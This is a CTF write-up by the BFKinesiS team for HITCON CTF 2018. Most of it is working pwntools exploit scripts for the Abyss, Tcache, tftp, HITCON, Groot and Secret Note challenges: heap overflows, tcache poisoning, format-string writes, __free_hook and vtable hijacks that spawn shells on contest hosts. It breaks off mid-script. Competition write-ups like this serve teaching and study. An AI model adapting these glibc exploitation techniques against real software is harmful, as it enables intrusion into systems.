# HITCON CTF 2018 Write up

Written by BFKinesiS

BFKinesiS consists of 4 different CTF teams from Taiwan, including [Balsn](https://balsn.tw/), [BambooFox](https://bamboofox.github.io/), KerKerYuan and DoubleSigma. We rank 3rd place in HITCON CTF 2018 among 1118 teams.

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20181019-hitconctf/) of this writeup.**


 - [HITCON CTF 2018 Write up](#hitcon-ctf-2018-write-up)
   - [Pwn](#pwn)
     - [Abyss I](#abyss-i)
     - [Abyss II](#abyss-ii)
     - [Baby Tcache](#baby-tcache)
     - [Children Tcache](#children-tcache)
     - [tftp](#tftp)
     - [HITCON](#hitcon)
       - [leak - first question](#leak---first-question)
       - [second question](#second-question)
     - [Groot](#groot)
       - [Vulnerability](#vulnerability)
       - [Leak](#leak)
       - [Exploit](#exploit)
     - [Secret Note](#secret-note)
       - [Vulnerability](#vulnerability-1)
       - [Thought proccess](#thought-proccess)
       - [Code](#code)
     - [Secret Note v2](#secret-note-v2)
       - [Thought proccess](#thought-proccess-1)
       - [Vulnerability](#vulnerability-2)
       - [Leak](#leak-1)
       - [Exploit](#exploit-1)
       - [Reflection](#reflection)
       - [Code](#code-1)
     - [Super Hexagon](#super-hexagon)
       - [EL0](#el0)
         - [Observation](#observation)
         - [exploit](#exploit-2)
       - [EL1](#el1)
         - [Observation](#observation-1)
         - [exploit](#exploit-3)
   - [Misc](#misc)
     - [EV3 Basic](#ev3-basic)
     - [EV3 Scanner](#ev3-scanner)
     - [Baldis-RE-Basics](#baldis-re-basics)
       - [install](#install)
       - [assemble](#assemble)
       - [disassemble](#disassemble)
       - [emulate](#emulate)
       - [risc-v](#risc-v)
       - [wasm](#wasm)
     - [32 world](#32-world)
     - [tooooo](#tooooo)
   - [Crypto](#crypto)
     - [Lost Modulus](#lost-modulus)
     - [Lost-Key](#lost-key)
       - [leak n](#leak-n)
       - [leak e](#leak-e)
       - [Least Significant <strong>Byte</strong> Oracle Attack](#least-significant-byte-oracle-attack)
   - [Web](#web)
     - [Oh My Raddit](#oh-my-raddit)
     - [Oh My Raddit v2](#oh-my-raddit-v2)
       - [Arbitrary File Read](#arbitrary-file-read)
       - [Browsing source code / issues](#browsing-source-code--issues)
     - [Baby Cake](#baby-cake)
       - [Failed Attempts](#failed-attempts)
       - [Arbitrary File Read](#arbitrary-file-read-1)
       - [phar unserialization to RCE](#phar-unserialization-to-rce)
   - [Reverse](#reverse)
     - [EOP](#eop)



## Pwn
### Abyss I
* NX disable.
* `swap` function doesn't check the index, and the `machine` == `stack[-1]`.

```clike
void swap_()
{
  unsigned int tmp;

  tmp = stack[machine - 1];
  stack[machine - 1] = stack[machine - 2];
  stack[machine - 2] = tmp;
}

```
* We can control the value of `machine` by `swap()`.

```python
p = '31' + 'a' + op['minus']         # -31
p += op['swap']                      # stack point to write.got
p += 'a' + op['store']               # store the high 4 byte
p += str( 2107662 + 70 ) + op['add'] # add offset -> write.got point to our input
p += 'a' + op['fetch']               # recover high 4 byte
p += op['write'],                    # write() to jmp to our shellcode

```
* exploit:

```python
#!/usr/bin/env python
from pwn import *

# hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}
# hitcon{take_out_all_memory,_take_away_your_soul}

context.arch = 'amd64'
host , port = '35.200.23.198' , 31733
y = remote( host , port )

kernel = open( './kernel.bin' ).read()

s = '31a-\\a:2107732+a;,' + '\x90' * 70
s += asm(
    shellcraft.pushstr( 'flag\x00' ) + 
    shellcraft.open( 'rsp' , 0 , 0 ) +
    shellcraft.read( 'rax' , 'rsp' , 0x70 ) +
    shellcraft.write( 1 , 'rsp' , 0x70 )
)

y.sendlineafter( 'down.' , s )

y.interactive()

```
### Abyss II
* Part of code of `hypercall read handler` in Hypervisor:

```c
rw((unsigned int)fd_map[fd].real_fd, *(_QWORD *)&vm->mem + buf, len);

```
Where `vm->mem` is our vm phisical address. Kernel entry is 0, if we can let `but` == 0, so that  we are able to overwrite the kernel memory. Hypervisor will get the return value of kmalloc().
* `Hypercall read handler`:

```clike
vaddr = *(_DWORD *)(vm->run + *(_QWORD *)(vm->run + 40LL));
if ( (unsigned __int64)vaddr >= vm->mem_size )
     __assert_fail("0 <= (offset) && (offset) < vm->mem_size", "hypercall.c", 0x7Eu, "handle_rw");
arg = (_QWORD *)(*(_QWORD *)&vm->mem + vaddr);
fd = *arg;
buf = arg[1];
len = arg[2];
MAY_INIT_FD_MAP();
if ( fd >= 0 && fd <= 255 && fd_map[fd].opening )
{
    if ( buf >= vm->mem_size )
        __assert_fail("0 <= (paddr) && (paddr) < vm->mem_size", "hypercall.c", 0x83u, "handle_rw");
    read_ret = rw((unsigned int)fd_map[fd].real_fd, *(_QWORD *)&vm->mem + buf, len);
    if ( read_ret < 0 )
        read_ret = -*__errno_location();
}
else
{
    read_ret = -9;
}

```
* Kernel sys_read():

```c
signed __int64 __usercall sys_read@<rax>(__int64 size_@<rdx>, int fd_@<edi>, unsigned __int64 buf@<rsi>)
{
  signed __int64 ret; // rbx
  __int64 l; // r12
  void *vbuf; // rbp
  _QWORD *dst; // r13
  __int64 paddr; // rsi
  __int64 v8; // rcx

  ret = -9i64;
  if ( fd_ >= 0 )
  {
    l = size_;
    vbuf = (void *)buf;
    ret = -14i64;
    if ( (unsigned int)access_ok(size_, 1, buf) )
    {
      dst = (_QWORD *)kmalloc(l, 0);
      paddr = physical((signed __int64)dst);
      ret = (signed int)hyper_read(l, v8, fd_, paddr);
      if ( ret >= 0 )
        qmemcpy(vbuf, dst, ret);
      kfree(dst);
    }
  }
  return ret;
}

__int64 __usercall hyper_read@<rax>(__int64 len@<rdx>, __int64 a2@<rcx>, int fd@<edi>, __int64 buf@<rsi>)
{
  __int64 l; // r12
  _QWORD *vaddr; // rax
  _QWORD *v; // rbx
  unsigned int paddr; // eax
  unsigned int v8; // ST0C_4

  l = len;
  vaddr = (_QWORD *)kmalloc(0x18ui64, 0);
  *vaddr = fd;
  vaddr[1] = buf;
  vaddr[2] = l;
  v = vaddr;
  paddr = physical((signed __int64)vaddr);
  vmmcall(0x8001u, paddr);
  kfree(v);
  return v8;
}

```
* Pass the return value of kmalloc() to hypervisor:

```c
dst = (_QWORD *)kmalloc(l, 0);
paddr = physical((signed __int64)dst);
ret = (signed int)hyper_read(l, v8, fd_, paddr);

```
* Now our goal is to let `kmalloc` return 0 value.
* Kernel kmalloc():

```c
signed __int64 __usercall kmalloc@<rax>(unsigned __int64 len@<rdi>, int align@<esi>)
{
  unsigned __int64 nb; // r8
  signed __int64 now; // rsi
  signed __int64 v4; // rdx
  unsigned __int64 now_size; // rax
  bool equal; // zf
  __int64 next; // rcx
  signed __int64 ret; // rax
  _QWORD *v9; // rcx
  signed __int64 r; // [rsp+0h] [rbp-10h]

  if ( len > 0xFFFFFFFF )
    return 0i64;
  nb = len + 16;
  if ( ((_BYTE)len + 16) & 0x7F )
    nb = (nb & 0xFFFFFFFFFFFFFF80ui64) + 0x80;
  if ( align )
  {
    if ( align != 0x1000 )
      hlt((unsigned __int64)"kmalloc.c#kmalloc: invalid alignment");
    if ( !((0xFF0 - MEMORY[0x4840]) & 0xFFF) || malloc_top((0xFF0 - MEMORY[0x4840]) & 0xFFF) )
    {
      malloc_top(nb);                           // r
      kfree(v9);
      ret = r;
      if ( r )
      {
        if ( !(r & 0xFFF) )
          return ret;
        hlt((unsigned __int64)"kmalloc.c#kmalloc: alignment request failed");
      }
    }
  }
  else
  {
    now = MEMORY[0x4860];
    v4 = 0x4850i64;
    while ( now )
    {
      now_size = *(_QWORD *)now;
      if ( (unsigned __int64)(*(_QWORD *)now - 1i64) > 0xFFFFFFFE || now_size & 0xF )
      {
        hlt((unsigned __int64)"kmalloc.c: invalid size of sorted bin");
LABEL_12:
        *(_QWORD *)(v4 + 16) = next;
        if ( !equal )
        {
          *(_QWORD *)(now + nb) = now_size - nb;
          insert_sorted((_QWORD *)(now + nb));
        }
        ret = now + 16;
        *(_QWORD *)now = nb;
        *(_OWORD *)(now + 8) = 0i64;
        if ( now != -16 )
          return ret;
        break;
      }
      equal = nb == now_size;
      next = *(_QWORD *)(now + 16);
      if ( nb <= now_size )
        goto LABEL_12;
      v4 = now;
      now = *(_QWORD *)(now + 16);
    }
    ret = malloc_top(nb);
    if ( ret )
      return ret;
  }
  return 0i64;
}

```
* There are two conditions that `kmalloc` will return 0.
    * len > 0xffffffff:
    ```c
    if ( len > 0xFFFFFFFF )
        return 0i64;
    ```
    * if kmalloc doesnt find the appropriate chunk in sorted bin, it will allocate from top by `malloc_top`.
    ```c
    ret = malloc_top(nb);
    if ( ret )
      return ret;
    ```
    * If `malloc_top` return 0, it won't return 0 directly, but `kmalloc` will still return 0 in the end.
    ```c
        ret = malloc_top(nb);
        if ( ret )
          return ret;
      }
      return 0;
    }
    ```
* We can not use the condition 1, because if we want to let the `len` to be 0x100000000, we need a memory space exactly has the 0x100000000 long space, due to `access_ok()` checking.
* We can't mmap that huge memory space.
* We have to go condition 2, let `malloc_top` return 0.
* `malloc_top`:

```c
signed __int64 malloc_top(unsigned __int64 nb)
{
  signed __int64 ret; // rax
  __int64 top; // rax
  unsigned __int64 new_top; // rdi

  ret = 0;
  if ( arena.top_size >= nb )
  {
    top = arena.top;
    arena.top_size -= nb;
    arena.top->size = nb;
    new_top = arena.top + nb;
    ret = arena.top + 16;
    arena.top = new_top;
  }
  return ret;
}

```
* Just give a size which lager than `arena.top_size`, it will return 0.
    1. `mmap(0, 0x1000000, 7)` -> `arena.top_size` remain the size < 0x1000000.
    2. `sys_read( 0, buf, 0x1000000 )` -> `kmalloc` in `hypercall read` will return 0.
    3. Pass 0 to hypervisor, `hypercall read handler` will do `read( 0, &vm->mem + 0 , 0x1000000 )`.
    4. Now we can overwrite the whole kernel space! 
* For flag2, I overwrite the opcodes in  kernel `sys_open` which do checking filename with `nop`.
* ORW flag2.
* exploit:

```python
#!/usr/bin/env python
from pwn import *

# hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}
# hitcon{take_out_all_memory,_take_away_your_soul}

context.arch = 'amd64'
host , port = '35.200.23.198' , 31733
y = remote( host , port )

kernel = open( './kernel.bin' ).read()

s = '31a-\\a:2107732+a;,' + '\x90' * 70
s += asm(
    '''
    mov rdi, 0
    mov rsi, 0x1000000
    mov rdx, 7
    mov r10, 16
    mov r8, -1
    mov r9, 0
    mov rax, 8
    inc rax
    syscall

    mov rbp, rax
    push rsp
    ''' +
    shellcraft.write( 1 , 'rsp' , 8 ) + 
    shellcraft.read( 0 , 'rbp' , 0x1000000 ) +
    shellcraft.pushstr( 'flag2\x00' ) + 
    shellcraft.open( 'rsp' , 0 , 0 ) +
    shellcraft.read( 'rax' , 'rsp' , 0x70 ) +
    shellcraft.write( 1 , 'rsp' , 0x70 )
)

y.sendlineafter( 'down.' , s )
y.recvline()
user_stack = u64( y.recv(8) )
success( 'User stack -> %s' % hex( user_stack ) )

kernel_mod = kernel[:0x14d] + p64( 0x8002000000 ) + p64( user_stack + 0x100 )
kernel_mod += kernel[0x15d:0x9a4] + '\x90' * 0x75

sleep(1)
y.send( kernel_mod )

y.interactive()

```

### Baby Tcache

Off-by-one null byte on heap.
Overwrite next chunck inuse bit and set proper pre_size.
Free next chunck and  it will merge to previous chunck.
At this point, there is a overlap large unsorted bin.
Free one 0x20 chunck and malloc property size.
Let unsorted bin fd overwrite tcache fd.
Partially ovewrite last two bytes to  tcache fd point to `_IO_2_1_stdout_`.
Then, you can malloc a address at `_IO_2_1_stdout_`.
Properly modify the value of `_IO_2_1_stdout_`.

* Set _flag = 0x800
* Overwrite last byte of write_base to zero
* _IO_read_end eqaul to _IO_write_base

```clike=
file = {
    _flags = 0xfbad2887,
    _IO_read_ptr = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n",
    _IO_read_end = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n",
    _IO_read_base = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_base = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_ptr = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_end = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n",
    ...

```
Beacause we don't know libc address, we partially ovewrite last byte of _IO_read_base.
Thanks to off-by-one, I can overwrite last byte of _IO_write_base to zero.
Next time call puts. It will print from _IO_write_base and leak libc address.

Malloc 0x100, there are two heap with same address.
Double free the same address and modify the fd to `__free_hook`.
Modify `__free_hook` value to `one_gadget` and get shell.

```python=
from pwn import *

#r = process(["./baby_tcache"])
r = remote("52.68.236.186", 56746)
def add(size,data):
        r.sendlineafter("choice:","1")
        r.sendlineafter(":",str(size))
        r.sendafter(":",data)

def remove(idx):
        r.sendlineafter("choice:","2")
        r.sendlineafter(":",str(idx))

add(0x500,"a") #0
add(0x20,"a")  #1
add(0x20,"a")  #2
add(0x4f0,"a")  #3
add(0xf0,"a")  #4
remove(2)
add(0x28,"a"*0x20+p64(0x570)) #2
remove(0)
remove(3)
remove(1)
add(0x500,"a") #0
add(0x100,p16(0x4760)) #1
add(0x20,"a") #3
add(0x20,p64(0x800)+"\x00"*0x9) #5

data = r.recvuntil("$")
libc = u64(data[8:16])-0x3ed8b0
print hex(libc)
remove(3)
remove(1)
add(0x100,p64(libc+0x3ed8e8))
add(0x100,p64(0x1234))
add(0x100,p64(libc+0x4f322))
remove(0)
r.interactive()

```

### Children Tcache
strcpy will cause off-one-byte null byte.
Beacause of the null terminating, we can't set pre_size and inuse bit at same time.
So we first set inuse bit of the next chunck.
Repeat free and malloc to fix pre_size to the correct value.
Free next chunck and get a overlapping unsorted bin.
Malloc a proper size to let unsorted bin fd overwrite to one heap content.
Call `Show heap` to leak libc address.

Malloc 0x30, there are two heap with same address.
Double free the same address and modify the fd to `__free_hook`.
Modify `__free_hook` value to `one_gadget` and get shell.


```python=
from pwn import *

#r = process(["./children_tcache"])
r = remote("54.178.132.125", 8763)
def add(size,data):
        r.sendlineafter("choice:","1")
        r.sendlineafter(":",str(size))
        r.sendafter(":",data)

def show(idx):
        r.sendlineafter("choice:","2")
        r.sendlineafter(":",str(idx))

def remove(idx):
        r.sendlineafter("choice:","3")
        r.sendlineafter(":",str(idx))

add(0x500,"a") #0
add(0x20,"a")  #1
add(0x20,"a")  #2
add(0x4f0,"a") #3
add(0x20,"a") #4

remove(2)
add(0x28,"a"*0x28) #2
remove(2)
add(0x27,"a"*0x27) #2
remove(2)
add(0x26,"a"*0x26) #2
remove(2)
add(0x25,"a"*0x25) #2
remove(2)
add(0x24,"a"*0x24) #2
remove(2)
add(0x23,"a"*0x23) #2
remove(2)
add(0x22,"a"*0x20+p16(0x570)) #2
remove(0)
remove(3)
add(0x500,"a") #0
show(1)
libc = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x3ebca0
print hex(libc)

add(0x30,"a")
remove(1)
remove(3)
add(0x30,p64(libc+0x3ed8e8))
add(0x30,"a")
add(0x30,p64(libc++0x4f322))
remove(1)


r.interactive()

```
### tftp
There is a format string vulnerability when mode is unknown.
Beacuse syslog take second parameter as a format string.
Now we have a arbitrarily write.

```clike=
  ...
    sprintf((char *)(v32 + 348), "unknown mode %s", *(_QWORD *)(v32 + 288));
    qmemcpy(&v30, (const void *)(v32 + 344), 0x200uLL);
    sub_400E9F((unsigned __int64)&v31, v32 + 88);
    syslog(3, (const char *)(v32 + 348));
    sub_400EF0(v32);
    return 1LL;
  ...

```
Because of no PIE, we can modify `dest` and `buf` without knowing code base.
We can craft a structure on .bss and `dest` point to it.
We also make `buf` point to near the structure we create.
So we can take input and craft the structure at the same time.
Use opcode 0x4 to leak libc by properly craft the structure.

```clike=
...
else if ( *((_DWORD *)dest + 79) > 3 &&
    ntohs(*((_WORD *)buf + 1)) == *((_WORD *)dest + 156) )
{
    ++*((_WORD *)dest + 156);
    ++*((_DWORD *)dest + 77);
    sub_4011D0(dest, v3);
}

```
sub_4011D0

```clike=
...
if ( ntohs(*(_WORD *)(*(_QWORD *)(dest + 328) + 2LL)) 
    == *(_WORD *)(dest + 312) )
{
    *_errno_location() = 0;
    write(1, *(dest + 328), *(dest + 320) + 4); // arbitrarily read
    ...
}

```
Because the libc version is 2.23, we can modify stdout vtable to anywhere.
We create a vtable where at offest 0x38 is system address.
Modify stdout vtable to vtable we create.
Modify stdout flag to 0x6873("sh").
Wait 60 second to trigger alarm handler to call puts.
It will call system("sh") to get shell.




```python=
from pwn import *

context.arch = "amd64"

r = process(["./tftp"])
#r = remote("52.68.37.204", 48763)
dest = 0x604a00
def write(addr,val):
        r.send("\x00\x02\x30\x00%{}c%157$n\x00".format(addr-0xd))
        r.recvrepeat(.1)
        r.send("\x00\x02\x30\x00%{}c%158$n\x00".format(val-0xd))
        r.recvrepeat(.1)

def write_byte(addr,val):
        r.send("\x00\x02\x30\x00%{}c%157$n\x00".format(addr-0xd))
        val -= 0xd
        if val <= 0:
                val+=0x100
        r.recvrepeat(.1)
        r.send("\x00\x02\x30\x00%{}c%158$hhn\x00".format(val))
        r.recvrepeat(.1)


write_byte(0x604001,0x1)
write(0x604030,dest-0x50)
write(0x604038,dest)

data = [0]*0x30
data[0] = 1
data[0x29] = 0x604000-2
data[0x28] = 0x16

r.send("\x00\x04\x00\x00".ljust(0x50,'\x00')+flat(data))
r.recvn(0x12)
libc = u64(r.recvn(8))-0x3c5620
print hex(libc)
one_gadget = libc+0x45390

write(0x604c00,one_gadget&0xffffff)
write(0x604c03,one_gadget>>24)
write(0x604bc8,0x6873)

value = 0x10
fmt = "%{}c%66$n".format(value-0xd)
fmt = fmt.ljust(15,"0")
addr = libc+0x3c56f8+3
payload = "\x00\x02\x30\x00" + fmt + p64(addr)
r.send(payload)
r.recvrepeat(.1)
value = 0x604c00-0x38
fmt = "%{}c%66$n".format(value-0xd)
fmt = fmt.ljust(15,"0")
addr = libc+0x3c56f8
payload = "\x00\x02\x30\x00" + fmt + p64(addr)
r.send(payload)
r.recvrepeat(.1)

value = 0x6873
fmt = "%{}c%66$n".format(value-0xd)
fmt = fmt.ljust(15,"0")
addr = libc+0x3c5620
payload = "\x00\x02\x30\x00" + fmt + p64(addr)
r.send(payload)
r.recvrepeat(.1)
r.interactive() # wait 60 second to get shell

```

### HITCON


The program is a simulated HITCON conference.

we can arrange the session like this

```
----------------------------------------
|     R0     |     R1     |     R2     |
----------------------------------------
| Beelzemon  | Armagemon  |   Jesmon   |
----------------------------------------
|  Angelboy  | david942j  |   Orange   |
----------------------------------------
| Apocalymon |  Omnimon   | Chronomon  |
----------------------------------------

```

I tested that there are four speakers can let us ask questions.  

nice speaker
1.david942j
2.Angelboy
3.Orange
normal speaker
4.Jesmon

A nice audience will go to a nice speaker's room first.
If there are any speaker can let audience ask question, nice audience will answer first.
It's multi-thread program. I spent a long time looking for race condition or asking for three questions but I couldn't find it.

Later, I found out that I can solve the ask twice.

```
----------------------------------------
|     R0     |     R1     |     R2     |
----------------------------------------
| Beelzemon  | Armagemon  |   Jesmon   |
----------------------------------------
|  Angelboy  | david942j  |   Orange   |
----------------------------------------
| Apocalymon |  Omnimon   | Chronomon  |
----------------------------------------

```
There are two chance to ask questions
The vulnerability is in the input data when I asked.
The input data can overflow the question buffer through strlen and strncpy functions.

#### leak - first question
We can cover the lowest byte of the pointer and we can get the thread stack address.

```
0x00007f48b0bf0000 0x00007f48b0bf1000 ---p      mapped
0x00007f48b0bf1000 0x00007f48b13f1000 rw-p      mapped   <------------------   get this address
0x00007f48b13f1000 0x00007f48b13f2000 ---p      mapped
0x00007f48b13f2000 0x00007f48b1bf2000 rw-p      mapped
0x00007f48b1bf2000 0x00007f48b1bf3000 ---p      mapped
0x00007f48b1bf3000 0x00007f48b23f3000 rw-p      mapped
0x00007f48b23f3000 0x00007f48b240a000 r-xp      /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007f48b240a000 0x00007f48b2609000 ---p      /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007f48b2609000 0x00007f48b260a000 r--p      /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007f48b260a000 0x00007f48b260b000 rw-p      /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007f48b260b000 0x00007f48b27a8000 r-xp      /lib/x86_64-linux-gnu/libm-2.27.so
0x00007f48b27a8000 0x00007f48b29a7000 ---p      /lib/x86_64-linux-gnu/libm-2.27.so
0x00007f48b29a7000 0x00007f48b29a8000 r--p      /lib/x86_64-linux-gnu/libm-2.27.so
0x00007f48b29a8000 0x00007f48b29a9000 rw-p      /lib/x86_64-linux-gnu/libm-2.27.so
0x00007f48b29a9000 0x00007f48b2b90000 r-xp      /home/tens/CTF/2018/HITCON/pwn/hitcon/libc.so.6
0x00007f48b2b90000 0x00007f48b2d90000 ---p      /home/tens/CTF/2018/HITCON/pwn/hitcon/libc.so.6
0x00007f48b2d90000 0x00007f48b2d94000 r--p      /home/tens/CTF/2018/HITCON/pwn/hitcon/libc.so.6
0x00007f48b2d94000 0x00007f48b2d96000 rw-p      /home/tens/CTF/2018/HITCON/pwn/hitcon/libc.so.6

```
Now we have thread stack and libc address.

#### second question
When we ask the question, we can override a pointer so that we got a arbitrarily write. 
We override the input name function return address so we can control rip.
Covered into one_gadget to get shell.


```python=
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '13.115.73.78'
port = 31733

binary = "./hitcon"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def Schedule(t ,Author):
  r.recvuntil(" Exit\n")
  r.sendline("3")
  time.sleep(0.01)
  r.sendline(str(t) + " " + str(Author))
  time.sleep(0.01)
  r.sendline("0 0")

def start():
  r.recvuntil(" Exit\n")
  r.sendline("4")

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':

  da = 1
  orange = 4
  angel = 7
  leak = 9

  Schedule(3,leak)
  Schedule(2,8)
  Schedule(1,2)

  Schedule(4,angel)
  Schedule(5,da)
  Schedule(6,orange)

  Schedule(7,5)
  Schedule(8,3)
  Schedule(9,6)
  start()
  
  r.recvuntil("go?\n")
  r.sendline("2")
  r.recvuntil("Any questions?\n")

  r.sendline("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaa@")
  r.recvuntil("alaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaa")
  addr = u64(r.recv(6).ljust(8,"\x00"))
  print("addr = {}".format(hex(addr)))
  libc = addr  + 0x15b88c0
  print("libc = {}".format(hex(libc)))
  if (libc & 0xfff) != 0:
    print("fuck libc")
    r.close()
    exit()
  magic = libc+0x0010A38C
  print("magic = {}".format(hex(magic)))
  r.sendline("")
  time.sleep(1)
  #raw_input("@")
  r.sendline("0")
  r.recvuntil("Any questions?\n")
  ret_addr = libc - 0x15b9248
  r.sendline("D"*91 + p64(ret_addr + 0x90))
  time.sleep(0.1)
  r.sendline(p64(magic))
  r.interactive()


```

### Groot

#### Vulnerability
* Uninitialized pointer on children
Creating a directory with `mkdir` does not set children to null. Normally this does not have effect because the `rm` command clears the children field of the deleted directory. However when deleting a nested directory like `./a/b/c`, it actually only clears the children field of `a`, letting `b` and `c` removed but with the children field unchecked.
What this does is the next time we use `mkdir` the directory created has inherently a children pointing to `c`, leading to a UAF vulnerability.

#### Leak
* Heap address
    * Leaking heap address is pretty straight forward.

```
mkdir 'a'*0x38
cd 'a'*0x38
mkdir 'a'*0x38
cd 'a'*0x38
mkdir 'a'*0x38
cd ../../
rm 'a'*0x38
mkdir a
ls a

```
* Libc address
    * Leaking libc address is a lot more complex. Because the biggest size we can allocate is in fastbin range.
    * The idea is to first create a UAF pointer like above.
    * Exhaust the top chunk to trigger malloc consolidate. This will create libc address on the heap.
    * Make the libc address be on the UAF pointer some how some way.
    * Note that the free chunk where the UAF pointer is pointed can't be allocated during the proccess above. Therefore, it's super complex and even I can't explain how I did it... QAQ
    * Also, `ls` allocates a chunk and doesn't free it, so it can be used to exhaust heap. I discovered this pretty late, so I used both `mkfile` and `ls` to exhaust heap. The code is pretty messy because of this...

#### Exploit
* With libc, heap address and UAF, it's not too hard to exploit using tcache.

```python
#!/usr/bin/env python2

from pwn import *
from IPython import embed
import re

context.arch = 'amd64'

r = remote('127.0.0.1', 7123)
lib = ELF('./libc.so.6')

def cmd(data):
    r.sendlineafter('$', data)

def mkfile(name, data):
    cmd('mkfile '+name) 
    r.sendlineafter('Content?', data)
def mkdir(name):
    cmd('mkdir '+name)
def cd(name):
    cmd('cd '+name)
def rm(name):
    cmd('rm '+name)
def ls(name):
    cmd('ls '+name)
def cat(name):
    cmd('cat '+name)

# leak
mkdir('a'*0x38)
cd('a'*0x38)
mkdir('a'*0x38)
cd('a'*0x38)
mkdir('a'*0x38)
cd('../../')
# UAF
rm('a'*0x38)
mkdir('a')
ls('a')
x = r.recvline().split()[2][:-4]
heap = u64(x.ljust(8, '\x00')) - 0x12d40
print 'heap: 0x%x' % heap

# cleanup
mkdir('b'*0x38)
cd('b'*0x38)
mkdir('b'*0x38)
cd('b'*0x38)
mkdir('b'*0x38)
cd('../../')


# exhaust heap & pad
mkdir('tmp')
cd('tmp')
for i in range(370):
    mkfile(str(i), 'a')
cd('..')
#raw_input("@")

libc_addr = heap + 0x20c00
print 'libc addr at: 0x%x' % libc_addr
# fill tache
# create small bin
'''
for i in range(43):
    mkfile(str(i), 'a')
'''
for i in range(43, 50):
    mkfile(str(i), 'a'*0x48)
for i in range(43):
    rm(str(i))
mkdir('DIR')
cd('DIR')
mkdir('DIR')
cd('DIR')
mkfile('1', '1'*0x48)
cd('../..')
for i in range(43, 50):
    rm(str(i))
for i in range(7):
    cmd('ls '.ljust(0x30, 'a'))
rm('DIR')
#for i in range(43, 50):
    #mkfile(str(i), 'a'*0x48)

#r.interactive()

mkdir('DIR')
cd('DIR')
mkdir('DIR2')
cd('..')

for i in range(0xcd):
    ls('flag')
rm('tmp/1')
rm('tmp/2')
cmd('ls '.ljust(0x63, 'a'))
cat('DIR/DIR2/DIR2')

x = r.recvuntil('$ ')
x = r.recvuntil('$ ', drop=True)
print repr(x)
libc = u64(x.ljust(8, '\x00')) - 0x3dacc8
print 'libc: 0x%x' % libc
raw_input("@")
#cmd('ls '.ljust(0x63, 'a'))

# clear arena
r.sendline('A'*0x10)
ls('A'*0x10)
for i in range(3):
    ls('A'*0x30)
for i in range(8):
    ls('A'*0x50)

# exploit
mkdir('JIZZ')
cd('JIZZ')
for i in range(10):
    mkdir('J')
    cd('J')
for i in range(10):
    cd('..')
cd('..')
rm('JIZZ')
mkdir('JIZZ')
rm('JIZZ/JIZZ')
ls('a')
ls('a')
__free_hook = libc + 0x3dc8a8
system = libc + 0x47dc0
#ls(flat(__free_hook-0x10+5-8)[:-1])
ls(flat(__free_hook-0x10)[:-1])
ls('a')
ls('a')
ls(flat(system))
mkfile('sh', '/bin/sh')
rm('sh')


r.interactive()

```

### Secret Note

#### Vulnerability
* Heap overflow
There is a heap overflow of 12 bytes when adding a note of AES with length multiple of 16. However, the length and content couldn't be controlled.

#### Thought proccess
* The heap overlay is as follows:

```
+-------------+
| flag1 & key |
|-------------|
|             |
|    a big    |
|   unsorted  |
|    chunk    |
|             |
+-------------+
|      N      |
+-------------+

```
* If we just trigger the overflow right away, the proccess will crash on the next allocation since the unsorted bin's `size` and `fd` are corrupted.
* The idea is to exhaust the `unsorted bin` and overflow the `N`. By doing this we could get `pow(key, 217, N)` on multiple `N`s and therefore use CRT to get the `key`.
* However, the trouble is that we could only `malloc` a limited amount of notes, and they are not enough to exhaust the `unsorted bin`.
* After several hours of trying, we discovered that `calloc` actually **DOES NOT** allocate from `tcache`, but freeing a calloced chunk put it in `tcache`! Wuuuuuuut!?
* Therefore, we can use `show note` to exhaust the `unsorted bin`, overflow the `N`, print the encrypted `key`, do this several times, run CRT on them, and get the `key`.
* After getting the `key`, just print the `flag1` and decrypt it :)

#### Code
* Overflow N

```python
#!/usr/bin/env python2

from pwn import *
from IPython import embed
from tqdm import trange
import pickle

f = open('pickle', 'wb')
a = []
for N in range(100):
    r = remote('52.194.203.194', 21700)

    def add(idx, typ, sz, data):
        r.sendlineafter('exit', '1')
        r.sendlineafter('index:', str(idx))
        r.sendlineafter('type:', str(typ))
        r.sendlineafter('size:', str(sz))
        r.sendafter('Note:', data)

    def show(idx):
        r.sendlineafter('exit', '2')
        r.sendlineafter('index:', str(idx))
        return r.recvline()

    def delete(idx):
        r.sendlineafter('exit', '3')
        r.sendlineafter('index:', str(idx))

    add(2, 1, 0x30, 'a'*0x30)
    for i in range(3, 7):
        add(i, 1, 0x10*i - 13, 'a'*(0x10*i - 13)) 
    add(7, 2, 96, 'a'*96)

# exhaust unsorted bin
    for i in range(7):
        x = show(7)
    for i in range(8-3):
        show(3)
    for i in range(6):
        X = show(4).strip()
    for i in range(5):
        show(5)

#X = show(4).strip()
    #print X
    blocks = [0]*4
    for i in range(4):
        blocks[i] = int(X[32*i:32*(i+1)], 16)
        #print '%x' % blocks[i]

#show(2)
#show(2)
    payload = N^blocks[1]
    payload = ('%032x' % payload).decode('hex')
    delete(2)
    add(2, 1, 0x30, 'a'*0x20+payload)
    show(2)
    xx = show(1).strip()
    #print x
    print xx
    a += [xx]
    #raw_input("@%d" % N)
    r.close()

pickle.dump(a, f)

```
* CRT

```python
import telnetlib
import codecs
import gmpy2
import pickle
from tqdm import tqdm, trange

